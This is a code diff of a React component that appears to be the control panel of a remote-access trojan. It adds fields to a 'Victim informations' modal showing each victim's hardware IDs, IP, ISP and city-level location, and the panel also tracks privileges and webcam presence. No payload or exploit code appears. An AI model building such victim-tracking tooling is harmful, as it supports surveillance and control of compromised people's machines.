@@ -12,13 +12,33 @@ interface User {
   ip: string;
   name: string;
   username: string;
+  hostname: string;
   version: string;
   location: string;
   os: string;
   privileges: string;
   currentWindow: string;
   hasWebcam: boolean;
+  system: string;
+  architecture: string;
+  cpu: string;
+  gpu: string;
+  ram: string;
+  hwid: string;
+  country: string;
+  region: string;
+  city: string;
+  cep: string;
+  isp: string;
 }
+
+interface networkDetails {
+  macAdress: string;
+  subnetMask: string;
+  gateway: string;
+  dns: string;
+}
+
 
 interface ContextMenuState {
   visible: boolean;
@@ -95,10 +115,10 @@ export default function Component() {
     setIsModalOpen(false);
   }
  
-  const Modal = () => (
+  const Modal = () => {
+    const selectedUser = users.find(user => user.id === selectedUserId);
   
-  
-      
+    return (
     <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
     <div className="bg-zinc-800 p-6 rounded-md text-white w-10/12 max-w-4xl h-4/5 overflow-y-auto space-y-6">
     <div className="absolute inset-0 flex items-center justify-center opacity-5 pointer-events-none">
@@ -111,22 +131,22 @@ export default function Component() {
       </div>
       {/* Botão de fechar */}
       
-      <button onClick={handleCloseModal} className="relative top-4 ri-1 text-red-700">
+      <button onClick={handleCloseModal} className="relative right-2 text-red-700">
         CLOSE
       </button>
-        <h2 className="text-3xl font-bold text-center">Victimin informations</h2>
+      <h2 className="text-3xl font-bold text-center">Victim informations</h2>
         <div className="grid grid-cols-2 gap-4">
           <div className="bg-zinc-900 p-4 rounded-md">
             <strong>Display Name:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">Faccin</p>
+            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.name || 'N/A'}</p>
           </div>
           <div className="bg-zinc-900 p-4 rounded-md">
             <strong>Hostname:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">DESKTOP-FIE65F7</p>
+            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.hostname || 'N/A'}</p>
           </div>
           <div className="bg-zinc-900 p-4 rounded-md">
             <strong>Username:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">Faccin</p>
+            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.username || 'N/A'}</p>
           </div>
         </div>
   
@@ -134,15 +154,15 @@ export default function Component() {
         <div className="grid grid-cols-2 gap-4">
           <div className="bg-zinc-900 p-4 rounded-md">
             <strong>System:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">Windows</p>
+            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.os || 'N/A'}</p>
           </div>
           <div className="bg-zinc-900 p-4 rounded-md">
             <strong>Version:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">10.0.19045</p>
+            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.version || 'N/A'}</p>
           </div>
           <div className="bg-zinc-900 p-4 rounded-md">
             <strong>Architecture:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">64bit</p>
+            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.architecture || 'N/A'}</p>
           </div>
         </div>
   
@@ -150,19 +170,19 @@ export default function Component() {
         <div className="grid grid-cols-2 gap-4">
           <div className="bg-zinc-900 p-4 rounded-md">
             <strong>CPU:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">AMD Ryzen 5 5600G with Radeon Graphics</p>
+            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.cpu || 'N/A'}</p>
           </div>
           <div className="bg-zinc-900 p-4 rounded-md">
             <strong>GPU:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">AMD Radeon(TM) Graphics</p>
+            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.gpu || 'N/A'}</p>
           </div>
           <div className="bg-zinc-900 p-4 rounded-md">
             <strong>RAM:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">15.0 GB</p>
+            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.ram || 'N/A'}</p>
           </div>
           <div className="bg-zinc-900 p-4 rounded-md">
             <strong>HWID:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">9BC0CC18-764D-11F3-F006-F0D076086579</p>
+            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.hwid || 'N/A'}</p>
           </div>
         </div>
   
@@ -170,7 +190,7 @@ export default function Component() {
         <div className="grid grid-cols-2 gap-4">
           <div className="bg-zinc-900 p-4 rounded-md">
             <strong>IP:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">172.16.0.2</p>
+            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.ip || 'N/A'}</p>
           </div>
           <div className="bg-zinc-900 p-4 rounded-md">
             <strong>MAC:</strong>
@@ -178,30 +198,29 @@ export default function Component() {
           </div>
           <div className="bg-zinc-900 p-4 rounded-md">
             <strong>Country:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">BR</p>
+            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.country || 'N/A'}</p>
           </div>
           <div className="bg-zinc-900 p-4 rounded-md">
             <strong>Region:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">Rio Grande do Sul</p>
+            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.region || 'N/A'}</p>
           </div>
           <div className="bg-zinc-900 p-4 rounded-md">
             <strong>City:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">Caxias do Sul</p>
+            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.city || 'N/A'}</p>
           </div>
           <div className="bg-zinc-900 p-4 rounded-md">
             <strong>CEP:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">95000-000</p>
+            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.cep || 'N/A'}</p>
           </div>
           <div className="bg-zinc-900 p-4 rounded-md">
             <strong>ISP:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">AS13335 Cloudflare, Inc.</p>
+            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.isp || 'N/A'}</p>
           </div>
         </div>
       </div>
-    </div>
-    
-    
+      </div>
   );
+};
   
   
 
@@ -318,7 +337,7 @@ export default function Component() {
               {users.map(user => (
                   <tr
                     key={user.id} 
-                    className={`border-b border-zinc-700 transition-colors duration-200 hover:bg-purple-700 bg-opacity-30`}
+                    className={`border-b border-zinc-700 transition-colors duration-200 hover:bg-purple-800 hover:bg-opacity-40 bg-opacity-30`}
                     onClick={() => handleUserClick(user.id)}
                     onContextMenu={(e) => handleContextMenu(e, user.id)}
                   >
